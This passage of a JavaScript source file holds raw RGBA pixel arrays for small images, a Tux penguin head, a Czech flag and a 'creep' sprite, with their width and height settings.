72, 255, 176, 146, 48, 255, 187, 154, 39, 255, 212, 177, 47, 255, 225, 188, 47, 255, 234, 194, 44, 255, 224, 184, 27, 255, 225, 187, 26, 255, 254, 216, 55, 255, 228, 193, 31, 255, 241, 207, 47, 255, 241, 211, 51, 255, 233, 207, 50, 255, 255, 233, 77, 255, 240, 219, 68, 255, 217, 195, 50, 255, 225, 203, 68, 255, 242, 221, 96, 255, 202, 181, 66, 255, 179, 158, 53, 255, 212, 193, 98, 255, 174, 156, 74, 255, 179, 161, 95, 255, 91, 75, 26, 255, 42, 29, 0, 255, 17, 8, 0, 255, 5, 0, 0, 255, 4, 3, 0, 255, 4, 4, 2, 255, 1, 0, 0, 255, 5, 3, 4, 255, 7, 5, 8, 255, 7, 5, 8, 255, 0, 0, 2, 255, 0, 1, 3, 255, 14, 15, 17, 255, 251, 255, 255, 255, 255, 254, 250, 255, 251, 250, 246, 255, 217, 213, 212, 255, 15, 7, 5, 255, 11, 2, 0, 255, 29, 16, 0, 255, 39, 20, 0, 255, 146, 123, 71, 255, 142, 115, 38, 255, 154, 125, 25, 255, 199, 166, 50, 255, 206, 172, 39, 255, 216, 180, 34, 255, 234, 195, 40, 255, 214, 172, 12, 255, 243, 202, 36, 255, 246, 205, 37, 255, 223, 185, 16, 255, 251, 213, 44, 255, 245, 211, 43, 255, 238, 207, 39, 255, 247, 219, 50, 255, 244, 217, 50, 255, 245, 220, 55, 255, 241, 217, 55, 255, 239, 214, 59, 255, 227, 203, 55, 255, 240, 217, 79, 255, 233, 210, 82, 255, 215, 192, 76, 255, 227, 203, 103, 255, 214, 192, 109, 255, 184, 164, 103, 255, 92, 77, 34, 255, 38, 25, 6, 255, 17, 10, 0, 255, 5, 2, 0, 255, 15, 14, 12, 255, 4, 2, 3, 255, 2, 0, 1, 255, 5, 3, 6, 255, 10, 8, 13, 255, 3, 3, 5, 255, 0, 1, 3, 255, 9, 10, 12, 255, 243, 247, 248, 255, 255, 254, 249, 255, 247, 244, 239, 255, 238, 230, 228, 255, 21, 10, 6, 255, 27, 13, 4, 255, 27, 9, 0, 255, 120, 97, 55, 255, 143, 115, 50, 255, 168, 137, 47, 255, 186, 152, 42, 255, 196, 161, 33, 255, 214, 177, 34, 255, 222, 183, 30, 255, 225, 185, 25, 255, 236, 195, 29, 255, 222, 181, 13, 255, 221, 180, 10, 255, 232, 194, 23, 255, 241, 203, 32, 255, 236, 199, 30, 255, 253, 221, 50, 255, 255, 226, 54, 255, 243, 215, 43, 255, 247, 219, 47, 255, 250, 224, 53, 255, 238, 211, 42, 255, 234, 206, 45, 255, 233, 206, 53, 255, 246, 219, 76, 255, 231, 206, 77, 255, 224, 197, 84, 255, 229, 203, 110, 255, 224, 202, 129, 255, 167, 150, 98, 255, 56, 42, 16, 255, 16, 6, 0, 255, 9, 2, 0, 255, 5, 1, 0, 255, 15, 11, 10, 255, 7, 3, 4, 255, 3, 1, 4, 255, 9, 7, 10, 255, 5, 5, 7, 255, 1, 2, 4, 255, 7, 8, 12, 255, 202, 206, 209, 255, 255, 253, 248, 255, 255, 250, 246, 255, 224, 214, 212, 255, 39, 26, 20, 255, 23, 5, 0, 255, 70, 49, 22, 255, 149, 121, 71, 255, 161, 129, 54, 255, 173, 139, 41, 255, 198, 162, 42, 255, 210, 170, 36, 255, 224, 184, 35, 255, 224, 184, 26, 255, 230, 188, 24, 255, 226, 183, 16, 255, 246, 204, 34, 255, 248, 208, 35, 255, 248, 208, 35, 255, 244, 206, 35, 255, 247, 211, 39, 255, 254, 221, 48, 255, 248, 217, 41, 255, 239, 208, 32, 255, 246, 216, 40, 255, 243, 213, 39, 255, 244, 214, 42, 255, 243, 212, 46, 255, 244, 214, 56, 255, 240, 210, 62, 255, 215, 186, 50, 255, 195, 164, 47, 255, 192, 163, 63, 255, 209, 186, 108, 255, 172, 153, 97, 255, 64, 49, 20, 255, 16, 4, 0, 255, 15, 8, 2, 255, 9, 4, 1, 255, 8, 4, 3, 255, 13, 9, 8, 255, 3, 1, 2, 255, 4, 2, 5, 255, 6, 6, 8, 255, 1, 2, 4, 255, 2, 3, 5, 255, 151, 155, 156, 255, 255, 254, 250, 255, 255, 254, 249, 255, 231, 223, 220, 255, 37, 24, 16, 255, 32, 13, 0, 255, 108, 83, 52, 255, 153, 122, 67, 255, 174, 138, 60, 255, 178, 141, 37, 255, 196, 158, 35, 255, 214, 172, 34, 255, 219, 175, 26, 255, 219, 177, 17, 255, 224, 181, 16, 255, 230, 187, 20, 255, 235, 193, 23, 255, 240, 200, 27, 255, 245, 207, 34, 255, 243, 205, 34, 255, 236, 198, 27, 255, 241, 205, 31, 255, 254, 221, 46, 255, 254, 221, 46, 255, 245, 214, 38, 255, 243, 211, 40, 255, 246, 213, 46, 255, 242, 208, 48, 255, 234, 199, 45, 255, 217, 182, 38, 255, 184, 150, 17, 255, 171, 136, 20, 255, 183, 151, 52, 255, 192, 166, 89, 255, 150, 129, 74, 255, 53, 36, 10, 255, 17, 5, 0, 255, 13, 6, 0, 255, 11, 6, 3, 255, 4, 0, 0, 255, 7, 3, 2, 255, 7, 5, 6, 255, 3, 1, 2, 255, 10, 10, 10, 255, 0, 2, 1, 255, 0, 2, 1, 255, 85, 89, 88, 255, 252, 253, 248, 255, 255, 254, 249, 255, 237, 232, 228, 255, 43, 33, 23, 255, 35, 16, 0, 255, 110, 86, 52, 255, 153, 122, 67, 255, 177, 141, 63, 255, 191, 154, 50, 255, 204, 164, 42, 255, 214, 172, 34, 255, 231, 187, 38, 255, 238, 195, 38, 255, 232, 190, 26, 255, 233, 192, 26, 255, 238, 197, 29, 255, 234, 196, 25, 255, 238, 202, 30, 255, 251, 213, 44, 255, 255, 220, 51, 255, 251, 214, 45, 255, 234, 198, 26, 255, 235, 201, 31, 255, 255, 221, 51, 255, 240, 207, 42, 255, 241, 207, 47, 255, 227, 190, 37, 255, 198, 160, 13, 255, 182, 143, 4, 255, 189, 150, 23, 255, 197, 157, 44, 255, 186, 151, 57, 255, 193, 165, 91, 255, 161, 140, 87, 255, 37, 20, 0, 255, 16, 3, 0, 255, 19, 12, 6, 255, 9, 4, 1, 255, 6, 2, 1, 255, 10, 6, 7, 255, 14, 12, 13, 255, 1, 0, 0, 255, 1, 1, 1, 255, 6, 8, 7, 255, 0, 2, 1, 255, 30, 34, 33, 255, 254, 255, 250, 255, 255, 254, 249, 255, 245, 240, 236, 255, 39, 30, 21, 255, 27, 9, 0, 255, 88, 64, 36, 255, 131, 101, 51, 255, 157, 123, 51, 255, 193, 157, 61, 255, 215, 176, 59, 255, 217, 177, 45, 255, 227, 186, 42, 255, 233, 192, 38, 255, 223, 183, 23, 255, 228, 189, 26, 255, 232, 195, 29, 255, 236, 199, 32, 255, 243, 209, 41, 255, 250, 213, 47, 255, 242, 207, 43, 255, 239, 204, 40, 255, 241, 206, 42, 255, 244, 209, 47, 255, 244, 208, 49, 255, 235, 198, 45, 255, 199, 162, 12, 255, 182, 141, 0, 255, 178, 139, 2, 255, 181, 141, 10, 255, 193, 153, 32, 255, 209, 168, 62, 255, 203, 168, 78, 255, 186, 157, 87, 255, 146, 124, 75, 255, 37, 21, 0, 255, 15, 2, 0, 255, 11, 3, 0, 255, 6, 0, 0, 255, 22, 18, 19, 255, 27, 22, 26, 255, 6, 4, 7, 255, 2, 0, 3, 255, 6, 6, 8, 255, 7, 9, 8, 255, 2, 4, 3, 255, 0, 4, 0, 255, 254, 255, 250, 255, 251, 252, 247, 255, 255, 253, 248, 255, 41, 34, 26, 255, 17, 3, 0, 255, 42, 22, 0, 255, 81, 56, 15, 255, 125, 95, 31, 255, 161, 127, 40, 255, 206, 169, 62, 255, 219, 181, 58, 255, 225, 186, 49, 255, 228, 188, 41, 255, 227, 186, 34, 255, 237, 198, 41, 255, 241, 203, 42, 255, 237, 202, 40, 255, 252, 217, 55, 255, 251, 215, 57, 255, 240, 204, 48, 255, 244, 207, 54, 255, 254, 217, 66, 255, 239, 202, 52, 255, 210, 172, 27, 255, 187, 148, 8, 255, 178, 139, 2, 255, 181, 141, 9, 255, 199, 158, 32, 255, 208, 168, 47, 255, 207, 167, 56, 255, 192, 154, 57, 255, 169, 134, 52, 255, 163, 135, 70, 255, 82, 61, 18, 255, 28, 13, 0, 255, 14, 3, 0, 255, 8, 0, 0, 255, 6, 2, 3, 255, 57, 52, 56, 255, 95, 90, 94, 255, 38, 36, 39, 255, 11, 9, 12, 255, 5, 5, 7, 255, 0, 2, 1, 255, 6, 11, 7, 255, 0, 4, 0, 255, 252, 254, 251, 255, 251, 251, 249, 255, 255, 251, 248, 255, 56, 51, 47, 255, 11, 2, 0, 255, 24, 11, 0, 255, 44, 25, 0, 255, 108, 85, 33, 255, 129, 101, 27, 255, 174, 141, 46, 255, 201, 165, 55, 255, 222, 182, 60, 255, 236, 196, 62, 255, 239, 198, 56, 255, 245, 205, 56, 255, 242, 203, 50, 255, 243, 206, 53, 255, 228, 191, 38, 255, 237, 196, 52, 255, 255, 216, 76, 255, 242, 200, 64, 255, 194, 151, 20, 255, 166, 126, 0, 255, 167, 126, 0, 255, 162, 123, 0, 255, 177, 139, 14, 255, 195, 156, 35, 255, 205, 165, 51, 255, 206, 168, 59, 255, 191, 156, 56, 255, 179, 145, 58, 255, 178, 148, 76, 255, 170, 147, 93, 255, 71, 53, 17, 255, 17, 4, 0, 255, 20, 11, 6, 255, 8, 2, 2, 255, 2, 0, 1, 255, 56, 54, 57, 255, 134, 132, 137, 255, 111, 109, 112, 255, 58, 56, 59, 255, 34, 34, 34, 255, 6, 8, 7, 255, 5, 10, 6, 255, 1, 8, 1, 255, 253, 255, 252, 255, 255, 255, 253, 255, 246, 245, 243, 255, 64, 60, 57, 255, 9, 2, 0, 255, 25, 15, 3, 255, 34, 20, 0, 255, 135, 116, 74, 255, 121, 97, 33, 255, 124, 95, 15, 255, 143, 109, 12, 255, 174, 138, 28, 255, 204, 164, 43, 255, 220, 180, 49, 255, 225, 183, 47, 255, 225, 184, 44, 255, 220, 182, 39, 255, 224, 183, 43, 255, 203, 161, 25, 255, 169, 126, 0, 255, 156, 112, 0, 255, 166, 121, 2, 255, 177, 135, 17, 255, 178, 137, 21, 255, 199, 159, 46, 255, 199, 161, 52, 255, 189, 152, 46, 255, 180, 146, 46, 255, 182, 147, 53, 255, 175, 143, 60, 255, 180, 150, 78, 255, 201, 175, 118, 255, 204, 183, 140, 255, 149, 134, 105, 255, 28, 18, 6, 255, 15, 7, 4, 255, 6, 2, 1, 255, 2, 0, 1, 255, 29, 27, 32, 255, 95, 93, 98, 255, 124, 122, 125, 255, 124, 122, 125, 255, 111, 111, 111, 255, 41, 43, 40, 255, 0, 4, 0, 255, 8, 15, 8, 255, 249, 249, 249, 255, 254, 254, 254, 255, 250, 248, 249, 255, 53, 49, 48, 255, 5, 0, 0, 255, 18, 10, 0, 255, 44, 32, 10, 255, 178, 162, 128, 255, 187, 167, 116, 255, 143, 120, 52, 255, 132, 103, 23, 255, 135, 102, 9, 255, 149, 112, 6, 255, 171, 131, 17, 255, 172, 130, 10, 255, 172, 131, 5, 255, 173, 130, 2, 255, 172, 129, 0, 255, 179, 134, 9, 255, 189, 143, 21, 255, 193, 146, 28, 255, 190, 145, 30, 255, 189, 145, 36, 255, 190, 149, 44, 255, 174, 134, 36, 255, 179, 143, 49, 255, 171, 140, 50, 255, 169, 141, 57, 255, 190, 160, 87, 255, 218, 190, 125, 255, 226, 201, 147, 255, 218, 197, 154, 255, 207, 191, 158, 255, 197, 185, 163, 255, 72, 64, 53, 255, 6, 1, 0, 255, 2, 1, 0, 255, 9, 9, 9, 255, 15, 13, 18, 255, 45, 43, 48, 255, 128, 126, 129, 255, 130, 128, 131, 255, 119, 117, 118, 255, 86, 86, 84, 255, 23, 25, 22, 255, 11, 16, 10, 255, 254, 254, 254, 255, 252, 252, 252, 255, 251, 249, 252, 255, 27, 25, 26, 255, 14, 10, 7, 255, 15, 8, 0, 255, 57, 48, 31, 255, 191, 177, 150, 255, 212, 197, 156, 255, 162, 142, 89, 255, 149, 124, 58, 255, 137, 108, 30, 255, 147, 113, 23, 255, 186, 151, 51, 255, 199, 161, 54, 255, 206, 164, 52, 255, 199, 158, 42, 255, 194, 152, 34, 255, 190, 145, 30, 255, 188, 142, 30, 255, 187, 140, 32, 255, 183, 139, 34, 255, 183, 139, 40, 255, 183, 142, 50, 255, 187, 149, 66, 255, 166, 133, 56, 255, 172, 144, 71, 255, 197, 172, 106, 255, 208, 186, 129, 255, 215, 193, 144, 255, 217, 197, 160, 255, 211, 194, 164, 255, 203, 191, 167, 255, 183, 176, 160, 255, 109, 102, 94, 255, 7, 3, 0, 255, 7, 6, 4, 255, 0, 0, 0, 255, 2, 0, 3, 255, 21, 19, 24, 255, 97, 95, 98, 255, 146, 144, 147, 255, 139, 137, 138, 255, 103, 103, 103, 255, 9, 11, 8, 255, 0, 4, 0, 255, 253, 255, 254, 255, 254, 255, 255, 255, 206, 206, 206, 255, 23, 21, 22, 255, 3, 2, 0, 255, 6, 1, 0, 255, 75, 67, 54, 255, 191, 180, 160, 255, 201, 188, 156, 255, 202, 184, 144, 255, 177, 156, 103, 255, 142, 117, 53, 255, 133, 106, 29, 255, 160, 128, 43, 255, 188, 153, 61, 255, 202, 164, 65, 255, 195, 156, 53, 255, 195, 154, 49, 255, 195, 152, 50, 255, 199, 155, 56, 255, 200, 156, 61, 255, 186, 143, 51, 255, 171, 129, 45, 255, 167, 128, 51, 255, 161, 126, 58, 255, 184, 154, 94, 255, 196, 171, 115, 255, 203, 183, 133, 255, 207, 189, 149, 255, 211, 195, 162, 255, 222, 208, 182, 255, 225, 214, 194, 255, 218, 210, 197, 255, 207, 203, 194, 255, 153, 149, 146, 255, 12, 11, 9, 255, 5, 5, 5, 255, 13, 13, 13, 255, 5, 3, 6, 255, 2, 0, 3, 255, 47, 45, 48, 255, 93, 91, 94, 255, 101, 99, 100, 255, 59, 57, 58, 255, 5, 5, 3, 255, 0, 2, 0, 255, 254, 255, 255, 255, 248, 250, 249, 255, 135, 135, 135, 255, 0, 0, 0, 255, 1, 0, 0, 255, 20, 16, 13, 255, 49, 42, 34, 255, 197, 188, 173, 255, 188, 177, 155, 255, 206, 193, 161, 255, 206, 188, 148, 255, 175, 153, 103, 255, 140, 116, 54, 255, 126, 99, 28, 255, 139, 107, 30, 255, 153, 121, 36, 255, 170, 134, 46, 255, 178, 143, 53, 255, 178, 138, 51, 255, 162, 122, 37, 255, 144, 106, 25, 255, 139, 100, 23, 255, 157, 118, 49, 255, 181, 145, 85, 255, 189, 158, 104, 255, 208, 181, 134, 255, 211, 189, 148, 255, 206, 190, 156, 255, 205, 191, 164, 255, 211, 200, 180, 255,
    236, 227, 210, 255, 254, 246, 235, 255, 249, 245, 236, 255, 246, 243, 238, 255, 191, 190, 188, 255, 73, 71, 72, 255, 2, 2, 2, 255, 0, 0, 0, 255, 14, 12, 15, 255, 3, 1, 4, 255, 10, 8, 11, 255, 27, 25, 28, 255, 31, 29, 30, 255, 17, 15, 16, 255, 1, 1, 0, 255, 2, 2, 0, 255, 254, 254, 252, 255, 235, 235, 233, 255, 34, 33, 31, 255, 5, 4, 2, 255, 9, 7, 8, 255, 3, 2, 0, 255, 33, 28, 24, 255, 197, 190, 180, 255, 207, 200, 184, 255, 206, 195, 173, 255, 203, 190, 158, 255, 199, 181, 141, 255, 186, 166, 116, 255, 162, 140, 83, 255, 141, 116, 52, 255, 132, 105, 36, 255, 127, 97, 25, 255, 132, 102, 29, 255, 135, 101, 30, 255, 135, 100, 32, 255, 142, 108, 44, 255, 159, 125, 64, 255, 181, 148, 95, 255, 203, 170, 125, 255, 216, 188, 149, 255, 213, 189, 155, 255, 200, 180, 153, 255, 209, 194, 171, 255, 233, 222, 204, 255, 248, 240, 227, 255, 255, 251, 241, 255, 254, 250, 241, 255, 253, 250, 243, 255, 252, 251, 247, 255, 249, 248, 246, 255, 164, 162, 163, 255, 13, 13, 13, 255, 5, 5, 5, 255, 1, 0, 0, 255, 12, 10, 11, 255, 4, 2, 5, 255, 2, 0, 3, 255, 1, 0, 0, 255, 1, 0, 0, 255, 4, 4, 4, 255, 1, 1, 1, 255, 252, 251, 247, 255, 121, 120, 116, 255, 1, 0, 0, 255, 6, 5, 3, 255, 7, 5, 6, 255, 6, 5, 3, 255, 82, 78, 75, 255, 223, 220, 213, 255, 219, 215, 204, 255, 208, 203, 184, 255, 200, 189, 167, 255, 205, 191, 162, 255, 209, 195, 158, 255, 201, 184, 140, 255, 185, 165, 115, 255, 175, 154, 101, 255, 162, 137, 81, 255, 159, 134, 78, 255, 157, 130, 75, 255, 170, 143, 90, 255, 195, 167, 119, 255, 208, 181, 136, 255, 209, 181, 142, 255, 208, 182, 149, 255, 204, 180, 152, 255, 208, 188, 164, 255, 208, 193, 174, 255, 227, 215, 201, 255, 249, 243, 231, 255, 255, 252, 243, 255, 255, 254, 247, 255, 251, 250, 245, 255, 252, 251, 246, 255, 249, 248, 244, 255, 254, 253, 251, 255, 226, 224, 225, 255, 95, 95, 95, 255, 8, 8, 8, 255, 4, 2, 3, 255, 3, 1, 2, 255, 4, 2, 5, 255, 3, 1, 4, 255, 1, 0, 0, 255, 2, 0, 1, 255, 0, 0, 0, 255, 2, 2, 2, 255, 192, 188, 185, 255, 17, 13, 10, 255, 18, 14, 13, 255, 9, 5, 4, 255, 1, 0, 0, 255, 24, 23, 21, 255, 198, 197, 195, 255, 253, 252, 248, 255, 230, 227, 220, 255, 217, 213, 201, 255, 200, 194, 178, 255, 192, 184, 163, 255, 199, 189, 162, 255, 206, 193, 161, 255, 204, 190, 155, 255, 200, 185, 146, 255, 209, 190, 150, 255, 208, 189, 149, 255, 207, 185, 146, 255, 208, 186, 149, 255, 210, 187, 153, 255, 204, 183, 152, 255, 204, 183, 156, 255, 210, 189, 168, 255, 203, 186, 168, 255, 224, 208, 193, 255, 232, 219, 210, 255, 244, 235, 228, 255, 252, 247, 241, 255, 249, 248, 243, 255, 254, 253, 249, 255, 255, 255, 251, 255, 255, 255, 251, 255, 253, 254, 249, 255, 255, 255, 253, 255, 255, 255, 255, 255, 181, 181, 181, 255, 19, 19, 19, 255, 3, 1, 2, 255, 10, 8, 9, 255, 2, 0, 3, 255, 4, 2, 5, 255, 1, 0, 0, 255, 4, 2, 3, 255, 1, 1, 1, 255, 8, 8, 8, 255, 81, 77, 74, 255, 6, 2, 0, 255, 5, 1, 0, 255, 4, 0, 0, 255, 11, 10, 8, 255, 101, 100, 98, 255, 255, 255, 253, 255, 248, 247, 245, 255, 248, 247, 242, 255, 230, 230, 222, 255, 205, 201, 190, 255, 188, 182, 168, 255, 194, 187, 168, 255, 204, 196, 173, 255, 204, 192, 168, 255, 195, 181, 155, 255, 204, 188, 162, 255, 207, 192, 163, 255, 207, 190, 164, 255, 204, 187, 161, 255, 199, 183, 158, 255, 195, 179, 156, 255, 203, 188, 169, 255, 220, 207, 191, 255, 234, 220, 209, 255, 243, 233, 224, 255, 243, 234, 229, 255, 248, 243, 239, 255, 255, 252, 249, 255, 255, 254, 252, 255, 254, 254, 252, 255, 252, 252, 250, 255, 239, 239, 237, 255, 253, 253, 251, 255, 255, 255, 253, 255, 241, 241, 241, 255, 255, 255, 255, 255, 62, 62, 62, 255, 28, 26, 27, 255, 2, 0, 1, 255, 5, 3, 6, 255, 6, 4, 7, 255, 2, 0, 1, 255, 9, 7, 8, 255, 4, 4, 4, 255, 9, 9, 9, 255, 41, 36, 33, 255, 25, 20, 17, 255, 4, 0, 0, 255, 4, 0, 0, 255, 42, 41, 39, 255, 217, 217, 215, 255, 251, 251, 251, 255, 254, 254, 252, 255, 249, 249, 247, 255, 242, 243, 238, 255, 221, 221, 213, 255, 199, 197, 185, 255, 192, 189, 174, 255, 200, 193, 175, 255, 204, 193, 175, 255, 201, 188, 171, 255, 202, 189, 170, 255, 202, 189, 170, 255, 202, 187, 166, 255, 203, 188, 167, 255, 206, 193, 174, 255, 208, 197, 179, 255, 216, 204, 188, 255, 227, 217, 205, 255, 238, 228, 218, 255, 254, 247, 239, 255, 255, 251, 247, 255, 255, 252, 251, 255, 253, 252, 250, 255, 249, 249, 249, 255, 254, 254, 254, 255, 255, 255, 253, 255, 253, 255, 252, 255, 244, 246, 243, 255, 248, 248, 246, 255, 255, 255, 253, 255, 252, 252, 252, 255, 220, 220, 220, 255, 1, 0, 0, 255, 15, 13, 14, 255, 4, 2, 5, 255, 2, 0, 3, 255, 1, 0, 0, 255, 6, 4, 5, 255, 1, 1, 1, 255, 1, 1, 1, 255
];
tux_head.width = 46;
tux_head.height = 55;
var cz_flag = [0, 95, 205, 255, 139, 175, 225, 255, 245, 245, 245, 255, 245, 245, 245, 255, 245, 245, 245, 255, 243, 243, 243, 255, 243, 243, 243, 255, 241, 241, 241, 255, 239, 239, 239, 255, 239, 239, 239, 255, 237, 237, 237, 255, 235, 235, 235, 255, 233, 233, 233, 255, 231, 231, 231, 255, 229, 229, 229, 255, 225, 227, 227, 255, 17, 93, 193, 255, 145, 188, 234, 255, 206, 221, 242, 255, 254, 254, 254, 255, 254, 254, 254, 255, 254, 254, 254, 255, 253, 253, 254, 255, 253, 253, 253, 255, 252, 252, 252, 255, 252, 252, 252, 255, 251, 251, 251, 255, 250, 250, 250, 255, 249, 249, 249, 255, 248, 248, 248, 255, 247, 247, 247, 255, 223, 223, 223, 255, 19, 95, 195, 255, 156, 187, 230, 255, 121, 173, 230, 255, 194, 213, 239, 255, 254, 254, 254, 255, 253, 253, 253, 255, 253, 253, 253, 255, 252, 252, 252, 255, 251, 251, 251, 255, 250, 250, 250, 255, 249, 249, 249, 255, 248, 248, 248, 255, 247, 247, 247, 255, 246, 246, 246, 255, 247, 247, 247, 255, 221, 221, 221, 255, 17, 93, 195, 255, 153, 185, 229, 255, 131, 170, 222, 255, 115, 169, 228, 255, 191, 211, 237, 255, 253, 253, 253, 255, 252, 252, 252, 255, 251, 251, 251, 255, 250, 250, 250, 255, 249, 249, 249, 255, 248, 248, 248, 255, 247, 247, 247, 255, 246, 246, 246, 255, 245, 245, 245, 255, 246, 246, 246, 255, 219, 219, 219, 255, 13, 89, 193, 255, 151, 184, 228, 255, 129, 169, 221, 255, 126, 166, 221, 255, 109, 164, 225, 255, 187, 208, 235, 255, 251, 251, 251, 255, 250, 250, 250, 255, 249, 249, 249, 255, 248, 248, 248, 255, 247, 247, 247, 255, 246, 246, 246, 255, 245, 245, 245, 255, 244, 244, 244, 255, 245, 245, 245, 255, 215, 215, 215, 255, 7, 85, 191, 255, 149, 182, 226, 255, 125, 166, 220, 255, 122, 163, 219, 255, 118, 160, 218, 255, 99, 157, 222, 255, 210, 135, 150, 255, 244, 156, 156, 255, 243, 153, 153, 255, 241, 149, 149, 255, 240, 146, 146, 255, 240, 143, 143, 255, 239, 140, 140, 255, 238, 137, 137, 255, 239, 153, 153, 255, 215, 7, 7, 255, 3, 81, 187, 255, 146, 180, 226, 255, 122, 163, 219, 255, 118, 160, 218, 255, 113, 157, 216, 255, 176, 109, 138, 255, 238, 59, 58, 255, 237, 53, 53, 255, 236, 47, 47, 255, 233, 42, 42, 255, 232, 36, 36, 255, 231, 31, 31, 255, 229, 25, 25, 255, 228, 20, 20, 255, 232, 54, 54, 255, 199, 0, 0, 255, 0, 77, 185, 255, 143, 178, 225, 255, 117, 160, 217, 255, 113, 157, 216, 255, 175, 108, 137, 255, 238, 58, 58, 255, 237, 52, 52, 255, 236, 47, 47, 255, 234, 42, 42, 255, 233, 36, 36, 255, 232, 31, 31, 255, 230, 25, 25, 255, 229, 20, 20, 255, 228, 16, 16, 255, 232, 50, 50, 255, 199, 0, 0, 255, 0, 71, 181, 255, 139, 175, 223, 255, 113, 157, 216, 255, 175, 107, 137, 255, 238, 58, 58, 255, 237, 52, 52, 255, 235, 46, 46, 255, 234, 41, 41, 255, 233, 35, 35, 255, 232, 30, 30, 255, 230, 25, 25, 255, 229, 19, 19, 255, 227, 15, 14, 255, 227, 11, 11, 255, 231, 47, 47, 255, 195, 0, 0, 255, 0, 65, 179, 255, 135, 172, 222, 255, 187, 131, 156, 255, 240, 88, 88, 255, 240, 84, 85, 255, 238, 80, 80, 255, 237, 75, 75, 255, 237, 70, 70, 255, 235, 66, 66, 255, 234, 61, 61, 255, 233, 57, 57, 255, 232, 53, 53, 255, 232, 50, 50, 255, 231, 47, 47, 255, 230, 44, 44, 255, 195, 0, 0, 255, 0, 57, 175, 255, 93, 0, 17, 255, 219, 0, 0, 255, 217, 0, 0, 255, 215, 0, 0, 255, 213, 0, 0, 255, 213, 0, 0, 255, 209, 0, 0, 255, 207, 0, 0, 255, 205, 0, 0, 255, 201, 0, 0, 255, 201, 0, 0, 255, 199, 0, 0, 255, 195, 0, 0, 255, 195, 0, 0, 255, 197, 0, 0, 255];
cz_flag.width = 16;
cz_flag.width = 16;
cz_flag.height = 11;
var creep_img = [255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255];
creep_img.width = 16;
creep_img.height = 16;
